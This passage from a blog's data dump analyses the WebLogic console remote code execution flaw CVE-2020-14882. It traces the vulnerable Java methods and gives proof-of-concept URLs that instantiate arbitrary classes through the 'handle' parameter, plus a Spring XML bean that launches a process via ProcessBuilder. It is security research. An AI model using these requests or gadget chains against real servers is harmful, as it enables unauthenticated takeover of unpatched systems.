class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\"></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\"></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;pb&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;start&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;calc.exe&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n"},{"title":"Weblogic 10.3.6.0版本 Console HTTP 协议远程代码执行漏洞（CVE-2020-14882）分析以及poc构造","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/timg.jpg","date":"2020-11-02T08:58:42.000Z","_content":"\n在Oracle官方发布的2020年10月关键补丁更新公告CPU中，包含一个存在于Weblogic Console中的高危远程代码执行漏洞CVE-2020-14882。该漏洞与CVE-2020-14883权限绕过漏洞配合，可以使得攻击者在未经身份验证的情况下执行任意代码并接管WebLogic Server Console。\n\n在这篇文章中，我们首先来看看CVE-2020-14882代码执行漏洞。而后续下一篇文章，我将深入的分析下CVE-2020-14883权限绕过漏洞，并说明二者是如何配合使用的。\n\nCVE-2020-14882\n--------------\n\n首先我们来研究下Weblogic Console HTTP协议远程代码执行漏洞。这个漏洞影响范围广：影响范围包含了Oracle Weblogic Server10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0这几个版本。\n\n网上关于这个漏洞的分析报告，多数是以Weblogic12版本展开的，10版本与12版本下的漏洞触发点相同点，但利用链不同。所以我在这里就拿Weblogic 10.3.6.0.0版本，对这个漏洞进行分析。\n\n按照惯例，我们从CVE-2020-14882相关漏洞细节入手，看看能不能还原出poc。\n\n关于CVE-2020-14882的漏洞详情如下：\n\n```\n“结合 CVE-2020-14883 漏洞，远程攻击者可以构造特殊的 HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server\nConsole 执行任意代码。”\n```\n\n从描述上来看，CVE-2020-14883是权限绕过漏洞，而CVE-2020-14882是后台代码执行漏洞。我们要是想利用CVE-2020-14882。因此我们可以得到如下两个信息：\n\n1.  攻击是通过向后台发送HTTP请求实现的\n\n2.  CVE-2020-14882须要有后台管理员权限\n\n在此之外，我们还通过一些披露可以知道：\n\n本次漏洞实际执行点位于com/bea/console/handles/HandleFactory.class中的getHandle方法下图红框处\n\n![337c31913917cad0ba284a2c3f35d4fc.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165530-28e4d908-1ce9-1.png)\n\n下面我们就试着还原一下这个漏洞：\n\n首先我们先以后台管理员的身份，访问一下后台地址\n\nhttp://localhost:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1\n\n在我们的请求发送到Weblogic服务器后，程序会执行到com/bea/console/utils/BreadcrumbBacking.class，并调用其中init方法，见下图\n\n![4ac9666365bfc98564be4cd91de43805.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165541-2f9430c8-1ce9-1.png)\n\nBreadcrumbBacking翻译过来大概是面包屑导航支持的意思。从笔者的理解来看，上图这里应该是Weblogic用来解析传入的url的作用。\n\n我们继续看init方法\n\n```java\npublic void init(HttpServletRequest req, HttpServletResponse res) {\n    if (req.getParameter(NO_BC) == null) {\n        \n...\n\n        String handleStr = this.findFirstHandle(req);\n        if (this.handle == null && handleStr != null && !handleStr.equals(\"\")) {\n            try {\n                this.handle = HandleFactory.getHandle(handleStr);\n                String name = this.handle.getDisplayName();\n                req.getSession().setAttribute(BREADCRUMB_CONTEXT_VALUE, name);\n            } catch (Exception var6) {\n            }\n        }\n\n        this.dispatchedValue = (BCValue)req.getSession().getAttribute(DISPATCHED_BREADCRUMB);\n    }\n}\n```\n\n上面节选了init方法中的一块代码片段，为什么要节选这个片段呢？原因很简单：这块代码段里多次出现了”Handle”字眼，这意味着代码涉及到从请求(req)中获取与Handle相关的操作。而代码中也存在着”HandleFactory.getHandle(handleStr);”\n\n回顾上文，本次漏洞实际执行点不正是位于com/bea/console/handles/HandleFactory.class中的getHandle方法中吗？\n\n看来漏洞入口被我们找到了，下面来看看怎么建立一条从url到漏洞入口的道路，重点分析如下代码\n\n![b25e91462b4994c165ba0d678d4bc1d7.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165553-36c39f96-1ce9-1.png)\n\n从上图可见，如果想执行69行的this.handle = HandleFactory.getHandle(handleStr);进入漏洞触发点，首先要满足67行的this.handle == null && handleStr != null && !handleStr.equals(\"\")条件\n\n而String类型的handleStr变量是从66行处的this.findFirstHandle(req)获取到的看看weblogic如何从请求中获取handle\n\n```java\n    public String findFirstHandle(HttpServletRequest request) {\n        String handle = null;\n        Enumeration parms = request.getParameterNames();\n\n        while(parms.hasMoreElements()) {\n            String parmName = (String)parms.nextElement();\n            String parm = request.getParameter(parmName);\n            if (LOG.isDebugEnabled()) {\n                LOG.debug(\"Looking at parameters = \" + parmName);\n                if (parmName.toLowerCase().indexOf(\"password\") == -1 && parm.toLowerCase().indexOf(\"password\") == -1) {\n                    LOG.debug(\"Looking at parm value = \" + parm);\n                } else {\n                    LOG.debug(\"Looking at parm value = ************\");\n                }\n            }\n\n            if (this.currentUrl.getParameter(parmName) == null) {\n                this.currentUrl.addParameter(parmName, parm);\n            }\n\n            if (parmName.indexOf(REQUEST_CONTEXT_VALUE) != -1) {\n                handle = parm;\n            }\n        }\n\n        return handle;\n    }\n```\n\nfindFirstHandle方法将会遍历请求中所有参数名以及参数值，随后通过如下代码判断参数名是否为”\nhandle”，代码如下:\n\n```java\nif (parmName.indexOf(REQUEST_CONTEXT_VALUE) != -1) {\n\n\thandle = parm;\n\n}\n```\n\n这里的REQUEST_CONTEXT_VALUE值为”handle”,见下图：\n\n![59ece6b0005427a66bfaeed26e13dab1.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165603-3ce2864e-1ce9-1.png)\n\n当请求参数中有名为handle的参数时，findFirstHandle会将该参数的值进行返回。我们动态调试一下，看看分析的对不对，构造如下url：\n\n<http://localhost:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=熊本熊本熊>\n\n![26c733411771d6d3b7213a21eb37a046.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165615-43d64e04-1ce9-1.png)\n\n可见findFirstHandle将”熊本熊本熊”字符串返回\n\n回到init方法中，findFirstHandle将返回的url中handle参数值传递给handleStr变量，见下图66行\n\n![427e12f6c22a8ccb953521ac06d2ff9d.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165626-4a1369dc-1ce9-1.png)\n\nhandleStr变量进入67行if分支，并传递给漏洞执行点getHandle方法中\n\ngetHandle方法中代码如下：\n\n```java\n    public static Handle getHandle(String serializedObjectID) {\n        if (StringUtils.isEmptyString(serializedObjectID)) {\n            throw new InvalidParameterException(\"No serialized object string specified\");\n        } else {\n            serializedObjectID = serializedObjectID.replace('+', ' ');\n            String serialized = HttpParsing.unescape(serializedObjectID, \"UTF-8\");\n            int open = serialized.indexOf(40);\n            if (open < 1) {\n                throw new InvalidParameterException(\"Syntax error parsing serializedObjectID string: \" + serialized);\n            } else {\n                String className = serialized.substring(0, open);\n                String objectIdentifier = serialized.substring(open + 2, serialized.length() - 2);\n\n                try {\n                    Class handleClass = Class.forName(className);\n                    Object[] args = new Object[]{objectIdentifier};\n                    Constructor handleConstructor = handleClass.getConstructor(String.class);\n                    return (Handle)handleConstructor.newInstance(args);\n                } catch (ClassNotFoundException var8) {\n                    throw new InvalidParameterException(\"No handle class found for type: \" + className);\n                } catch (Exception var9) {\n                    throw new InvalidParameterException(\"Unable to instanciate handle type: \" + className, var9);\n                }\n            }\n        }\n    }\n```\n\n其实这里的内容很简单，让我们换一个poc，大家就会很清晰的了解getHandle的功能以及为什么可以造成代码执行漏洞。我们这里更换的poc如下：\n\n<http://localhost:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String(\"kumamon.fun\")>\n\n此时传入getHandle的变量为String类型的字符串：java.lang.String(\"kumamon.fun\")，见下图\n\n![35ddc015a8b2deb9a9809b46c2a3857f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165638-519f7b96-1ce9-1.png)\n\n接着getHandle方法判断字符串中左括号“(”的位置。(左括号ascii码值为40)，见下图\n\n![0be72a36dbd1638822c43a7c05d3815f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165648-57677f60-1ce9-1.png)\n\n紧接着，通过左括号位置，获取className以及objectIdentifier\n\n![3a9f5620e9e459c287958cf754780547.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165658-5d4151b8-1ce9-1.png)\n\n这里className为字符串：java.lang.String而objectIdentifier为字符串kumamon.fun\n\n接着程序做了三件事情：\n\n![698d79a1d772b6b0916f38db05d79b9a.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165708-635f032e-1ce9-1.png)\n\n1.  通过className获取对应的Class对象\n\n2.  将String类型的objectIdentifier存入 Object[]数组中\n\n3.  获取该类的带String类型参数的构造方法\n\n最后，程序调用该带String类型参数的构造方法，实例化一个对象\n\n![84d53abd6ffa717c23a1e140cef89675.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165718-692f1b68-1ce9-1.png)\n\n漏洞触发点到此已经分析结束了。回顾上文，当我们构造一个如下url时：\n\n<http://localhost:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=a(\"b\")>\n\nWeblogic将会调用a方法的带String类型参数的构造方法，并将b字符串传入执行\n\n那么我们怎么样才能找到这样一个利用链呢？需要满足恶意类中存在带String类型参数的构造方法、且该构造方法中存在着可以利用的地方，使得我们构造的字符串传入后可以顺利的执行。\n\n\n\nPOC\n--------------\n\n不得不说，Weblogic的漏洞往往有着关联，比如说CVE-2019-2725，这个漏洞当时遇到的payload的条件与这次的几乎一样，在CVE-2019-2725漏洞中，廖新喜给出了一个无视jdk版本限制的利用链：\n\ncom.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext\n\n<http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/>\n\n\n\n但廖大神并没有给出具体的利用方式。详细的Poc构造以及利用可以参考我的这篇文章：\n\n*https://kumamon.fun/CVE-2020-14882/*\n\n里面利用到的利用链即为：\n\ncom.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 这条\n\n![a5771d8a2b3650d45648e2d743bb0c5f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165732-71dc06c2-1ce9-1.png)\n\n于此同时，com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext\n\n与FileSystemXmlApplicationContext相同，都是继承了AbstractXmlApplicationContext类，因此ClassPathXmlApplicationContext这条也是可用的\n\n![8b0786bd524d4951164bc0a0a1a95525.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165743-7873e1bc-1ce9-1.png)\n\n\n\n写在最后\n--------\n\n本来想将CVE-2020-14882、CVE-2020-14883放到一篇文章中来介绍，但奈何CVE-2020-14883这个漏洞中内容也挺多的，放在一块文章太长了。写的多不如写的细，因此把他们分开成为两个文章。\n\n后续关于FileSystemXmlApplicationContext这条利用链是如何构造的，我也想写一篇文章详细的谈谈，希望大家喜欢。","source":"_posts/cve-2020-14882-analysis.md","raw":"---\ntitle: Weblogic 10.3.6.0版本 Console HTTP 协议远程代码执行漏洞（CVE-2020-14882）分析以及poc构造\ntags: web漏洞分析\ncategories: 技术\ntop_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'\ncover: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/timg.jpg'\ndate: 2020-11-02 16:58:42\n---\n\n在Oracle官方发布的2020年10月关键补丁更新公告CPU中，包含一个存在于Weblogic Console中的高危远程代码执行漏洞CVE-2020-14882。该漏洞与CVE-2020-14883权限绕过漏洞配合，可以使得攻击者在未经身份验证的情况下执行任意代码并接管WebLogic Server Console。\n\n在这篇文章中，我们首先来看看CVE-2020-14882代码执行漏洞。而后续下一篇文章，我将深入的分析下CVE-2020-14883权限绕过漏洞，并说明二者是如何配合使用的。\n\nCVE-2020-14882\n--------------\n\n首先我们来研究下Weblogic Console HTTP协议远程代码执行漏洞。这个漏洞影响范围广：影响范围包含了Oracle Weblogic Server10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0这几个版本。\n\n网上关于这个漏洞的分析报告，多数是以Weblogic12版本展开的，10版本与12版本下的漏洞触发点相同点，但利用链不同。所以我在这里就拿Weblogic 10.3.6.0.0版本，对这个漏洞进行分析。\n\n按照惯例，我们从CVE-2020-14882相关漏洞细节入手，看看能不能还原出poc。\n\n关于CVE-2020-14882的漏洞详情如下：\n\n```\n“结合 CVE-2020-14883 漏洞，远程攻击者可以构造特殊的 HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server\nConsole 执行任意代码。”\n```\n\n从描述上来看，CVE-2020-14883是权限绕过漏洞，而CVE-2020-14882是后台代码执行漏洞。我们要是想利用CVE-2020-14882。因此我们可以得到如下两个信息：\n\n1.  攻击是通过向后台发送HTTP请求实现的\n\n2.  CVE-2020-14882须要有后台管理员权限\n\n在此之外，我们还通过一些披露可以知道：\n\n本次漏洞实际执行点位于com/bea/console/handles/HandleFactory.class中的getHandle方法下图红框处\n\n![337c31913917cad0ba284a2c3f35d4fc.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165530-28e4d908-1ce9-1.png)\n\n下面我们就试着还原一下这个漏洞：\n\n首先我们先以后台管理员的身份，访问一下后台地址\n\nhttp://localhost:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1\n\n在我们的请求发送到Weblogic服务器后，程序会执行到com/bea/console/utils/BreadcrumbBacking.class，并调用其中init方法，见下图\n\n![4ac9666365bfc98564be4cd91de43805.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165541-2f9430c8-1ce9-1.png)\n\nBreadcrumbBacking翻译过来大概是面包屑导航支持的意思。从笔者的理解来看，上图这里应该是Weblogic用来解析传入的url的作用。\n\n我们继续看init方法\n\n```java\npublic void init(HttpServletRequest req, HttpServletResponse res) {\n    if (req.getParameter(NO_BC) == null) {\n        \n...\n\n        String handleStr = this.findFirstHandle(req);\n        if (this.handle == null && handleStr != null && !handleStr.equals(\"\")) {\n            try {\n                this.handle = HandleFactory.getHandle(handleStr);\n                String name = this.handle.getDisplayName();\n                req.getSession().setAttribute(BREADCRUMB_CONTEXT_VALUE, name);\n            } catch (Exception var6) {\n            }\n        }\n\n        this.dispatchedValue = (BCValue)req.getSession().getAttribute(DISPATCHED_BREADCRUMB);\n    }\n}\n```\n\n上面节选了init方法中的一块代码片段，为什么要节选这个片段呢？原因很简单：这块代码段里多次出现了”Handle”字眼，这意味着代码涉及到从请求(req)中获取与Handle相关的操作。而代码中也存在着”HandleFactory.getHandle(handleStr);”\n\n回顾上文，本次漏洞实际执行点不正是位于com/bea/console/handles/HandleFactory.class中的getHandle方法中吗？\n\n看来漏洞入口被我们找到了，下面来看看怎么建立一条从url到漏洞入口的道路，重点分析如下代码\n\n![b25e91462b4994c165ba0d678d4bc1d7.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165553-36c39f96-1ce9-1.png)\n\n从上图可见，如果想执行69行的this.handle = HandleFactory.getHandle(handleStr);进入漏洞触发点，首先要满足67行的this.handle == null && handleStr != null && !handleStr.equals(\"\")条件\n\n而String类型的handleStr变量是从66行处的this.findFirstHandle(req)获取到的看看weblogic如何从请求中获取handle\n\n```java\n    public String findFirstHandle(HttpServletRequest request) {\n        String handle = null;\n        Enumeration parms = request.getParameterNames();\n\n        while(parms.hasMoreElements()) {\n            String parmName = (String)parms.nextElement();\n            String parm = request.getParameter(parmName);\n            if (LOG.isDebugEnabled()) {\n                LOG.debug(\"Looking at parameters = \" + parmName);\n                if (parmName.toLowerCase().indexOf(\"password\") == -1 && parm.toLowerCase().indexOf(\"password\") == -1) {\n                    LOG.debug(\"Looking at parm value = \" + parm);\n                } else {\n                    LOG.debug(\"Looking at parm value = ************\");\n                }\n            }\n\n            if (this.currentUrl.getParameter(parmName) == null) {\n                this.currentUrl.addParameter(parmName, parm);\n            }\n\n            if (parmName.indexOf(REQUEST_CONTEXT_VALUE) != -1) {\n                handle = parm;\n            }\n        }\n\n        return handle;\n    }\n```\n\nfindFirstHandle方法将会遍历请求中所有参数名以及参数值，随后通过如下代码判断参数名是否为”\nhandle”，代码如下:\n\n```java\nif (parmName.indexOf(REQUEST_CONTEXT_VALUE) != -1) {\n\n\thandle = parm;\n\n}\n```\n\n这里的REQUEST_CONTEXT_VALUE值为”handle”,见下图：\n\n![59ece6b0005427a66bfaeed26e13dab1.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165603-3ce2864e-1ce9-1.png)\n\n当请求参数中有名为handle的参数时，findFirstHandle会将该参数的值进行返回。我们动态调试一下，看看分析的对不对，构造如下url：\n\n<http://localhost:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=熊本熊本熊>\n\n![26c733411771d6d3b7213a21eb37a046.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165615-43d64e04-1ce9-1.png)\n\n可见findFirstHandle将”熊本熊本熊”字符串返回\n\n回到init方法中，findFirstHandle将返回的url中handle参数值传递给handleStr变量，见下图66行\n\n![427e12f6c22a8ccb953521ac06d2ff9d.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165626-4a1369dc-1ce9-1.png)\n\nhandleStr变量进入67行if分支，并传递给漏洞执行点getHandle方法中\n\ngetHandle方法中代码如下：\n\n```java\n    public static Handle getHandle(String serializedObjectID) {\n        if (StringUtils.isEmptyString(serializedObjectID)) {\n            throw new InvalidParameterException(\"No serialized object string specified\");\n        } else {\n            serializedObjectID = serializedObjectID.replace('+', ' ');\n            String serialized = HttpParsing.unescape(serializedObjectID, \"UTF-8\");\n            int open = serialized.indexOf(40);\n            if (open < 1) {\n                throw new InvalidParameterException(\"Syntax error parsing serializedObjectID string: \" + serialized);\n            } else {\n                String className = serialized.substring(0, open);\n                String objectIdentifier = serialized.substring(open + 2, serialized.length() - 2);\n\n                try {\n                    Class handleClass = Class.forName(className);\n                    Object[] args = new Object[]{objectIdentifier};\n                    Constructor handleConstructor = handleClass.getConstructor(String.class);\n                    return (Handle)handleConstructor.newInstance(args);\n                } catch (ClassNotFoundException var8) {\n                    throw new InvalidParameterException(\"No handle class found for type: \" + className);\n                } catch (Exception var9) {\n                    throw new InvalidParameterException(\"Unable to instanciate handle type: \" + className, var9);\n                }\n            }\n        }\n    }\n```\n\n其实这里的内容很简单，让我们换一个poc，大家就会很清晰的了解getHandle的功能以及为什么可以造成代码执行漏洞。我们这里更换的poc如下：\n\n<http://localhost:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String(\"kumamon.fun\")>\n\n此时传入getHandle的变量为String类型的字符串：java.lang.String(\"kumamon.fun\")，见下图\n\n![35ddc015a8b2deb9a9809b46c2a3857f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165638-519f7b96-1ce9-1.png)\n\n接着getHandle方法判断字符串中左括号“(”的位置。(左括号ascii码值为40)，见下图\n\n![0be72a36dbd1638822c43a7c05d3815f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165648-57677f60-1ce9-1.png)\n\n紧接着，通过左括号位置，获取className以及objectIdentifier\n\n![3a9f5620e9e459c287958cf754780547.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165658-5d4151b8-1ce9-1.png)\n\n这里className为字符串：java.lang.String而objectIdentifier为字符串kumamon.fun\n\n接着程序做了三件事情：\n\n![698d79a1d772b6b0916f38db05d79b9a.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165708-635f032e-1ce9-1.png)\n\n1.  通过className获取对应的Class对象\n\n2.  将String类型的objectIdentifier存入 Object[]数组中\n\n3.  获取该类的带String类型参数的构造方法\n\n最后，程序调用该带String类型参数的构造方法，实例化一个对象\n\n![84d53abd6ffa717c23a1e140cef89675.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165718-692f1b68-1ce9-1.png)\n\n漏洞触发点到此已经分析结束了。回顾上文，当我们构造一个如下url时：\n\n<http://localhost:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=a(\"b\")>\n\nWeblogic将会调用a方法的带String类型参数的构造方法，并将b字符串传入执行\n\n那么我们怎么样才能找到这样一个利用链呢？需要满足恶意类中存在带String类型参数的构造方法、且该构造方法中存在着可以利用的地方，使得我们构造的字符串传入后可以顺利的执行。\n\n\n\nPOC\n--------------\n\n不得不说，Weblogic的漏洞往往有着关联，比如说CVE-2019-2725，这个漏洞当时遇到的payload的条件与这次的几乎一样，在CVE-2019-2725漏洞中，廖新喜给出了一个无视jdk版本限制的利用链：\n\ncom.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext\n\n<http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/>\n\n\n\n但廖大神并没有给出具体的利用方式。详细的Poc构造以及利用可以参考我的这篇文章：\n\n*https://kumamon.fun/CVE-2020-14882/*\n\n里面利用到的利用链即为：\n\ncom.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 这条\n\n![a5771d8a2b3650d45648e2d743bb0c5f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165732-71dc06c2-1ce9-1.png)\n\n于此同时，com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext\n\n与FileSystemXmlApplicationContext相同，都是继承了AbstractXmlApplicationContext类，因此ClassPathXmlApplicationContext这条也是可用的\n\n![8b0786bd524d4951164bc0a0a1a95525.png](https://xzfile.aliyuncs.com/media/upload/picture/20201102165743-7873e1bc-1ce9-1.png)\n\n\n\n写在最后\n--------\n\n本来想将CVE-2020-14882、CVE-2020-14883放到一篇文章中来介绍，但奈何CVE-2020-14883这个漏洞中内容也挺多的，放在一块文章太长了。写的多不如写的细，因此把他们分开成为两个文章。\n\n后续关于FileSystemXmlApplicationContext这条利用链是如何构造的，我也想写一篇文章详细的谈谈，希望大家喜欢。","slug":"cve-2020-14882-analysis","published":1,"updated":"2020-11-02T09:03:51.085Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckh0bgtro0000z4a91rcphbgx","content":"<p>在Oracle官方发布的2020年10月关键补丁更新公告CPU中，包含一个存在于Weblogic Console中的高危远程代码执行漏洞CVE-2020-14882。该漏洞与CVE-2020-14883权限绕过漏洞配合，可以使得攻击者在未经身份验证的情况下执行任意代码并接管WebLogic Server Console。</p>\n<p>在这篇文章中，我们首先来看看CVE-2020-14882代码执行漏洞。而后续下一篇文章，我将深入的分析下CVE-2020-14883权限绕过漏洞，并说明二者是如何配合使用的。</p>\n<h2 id=\"CVE-2020-14882\"><a href=\"#CVE-2020-14882\" class=\"headerlink\" title=\"CVE-2020-14882\"></a>CVE-2020-14882</h2><p>首先我们来研究下Weblogic Console HTTP协议远程代码执行漏洞。这个漏洞影响范围广：影响范围包含了Oracle Weblogic Server10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0这几个版本。</p>\n<p>网上关于这个漏洞的分析报告，多数是以Weblogic12版本展开的，10版本与12版本下的漏洞触发点相同点，但利用链不同。所以我在这里就拿Weblogic 10.3.6.0.0版本，对这个漏洞进行分析。</p>\n<p>按照惯例，我们从CVE-2020-14882相关漏洞细节入手，看看能不能还原出poc。</p>\n<p>关于CVE-2020-14882的漏洞详情如下：</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">“结合 CVE-2020-14883 漏洞，远程攻击者可以构造特殊的 HTTP请求，在未经身份验证的情况下接管 WebLogic<span class=\"built_in\"> Server Console </span>，并在 WebLogic Server</span><br><span class=\"line\">Console 执行任意代码。”</span><br></pre></td></tr></table></figure>\n\n<p>从描述上来看，CVE-2020-14883是权限绕过漏洞，而CVE-2020-14882是后台代码执行漏洞。我们要是想利用CVE-2020-14882。因此我们可以得到如下两个信息：</p>\n<ol>\n<li><p>攻击是通过向后台发送HTTP请求实现的</p>\n</li>\n<li><p>CVE-2020-14882须要有后台管理员权限</p>\n</li>\n</ol>\n<p>在此之外，我们还通过一些披露可以知道：</p>\n<p>本次漏洞实际执行点位于com/bea/console/handles/HandleFactory.class中的getHandle方法下图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165530-28e4d908-1ce9-1.png\" alt=\"337c31913917cad0ba284a2c3f35d4fc.png\"></p>\n<p>下面我们就试着还原一下这个漏洞：</p>\n<p>首先我们先以后台管理员的身份，访问一下后台地址</p>\n<p><a href=\"http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1\">http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1</a></p>\n<p>在我们的请求发送到Weblogic服务器后，程序会执行到com/bea/console/utils/BreadcrumbBacking.class，并调用其中init方法，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165541-2f9430c8-1ce9-1.png\" alt=\"4ac9666365bfc98564be4cd91de43805.png\"></p>\n<p>BreadcrumbBacking翻译过来大概是面包屑导航支持的意思。从笔者的理解来看，上图这里应该是Weblogic用来解析传入的url的作用。</p>\n<p>我们继续看init方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse res)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (req.getParameter(NO_BC) == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">        String handleStr = <span class=\"keyword\">this</span>.findFirstHandle(req);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.handle == <span class=\"keyword\">null</span> &amp;&amp; handleStr != <span class=\"keyword\">null</span> &amp;&amp; !handleStr.equals(<span class=\"string\">&quot;&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.handle = HandleFactory.getHandle(handleStr);</span><br><span class=\"line\">                String name = <span class=\"keyword\">this</span>.handle.getDisplayName();</span><br><span class=\"line\">                req.getSession().setAttribute(BREADCRUMB_CONTEXT_VALUE, name);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception var6) &#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.dispatchedValue = (BCValue)req.getSession().getAttribute(DISPATCHED_BREADCRUMB);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面节选了init方法中的一块代码片段，为什么要节选这个片段呢？原因很简单：这块代码段里多次出现了”Handle”字眼，这意味着代码涉及到从请求(req)中获取与Handle相关的操作。而代码中也存在着”HandleFactory.getHandle(handleStr);”</p>\n<p>回顾上文，本次漏洞实际执行点不正是位于com/bea/console/handles/HandleFactory.class中的getHandle方法中吗？</p>\n<p>看来漏洞入口被我们找到了，下面来看看怎么建立一条从url到漏洞入口的道路，重点分析如下代码</p>\n<p><img src= \"/img/loading.gif\" 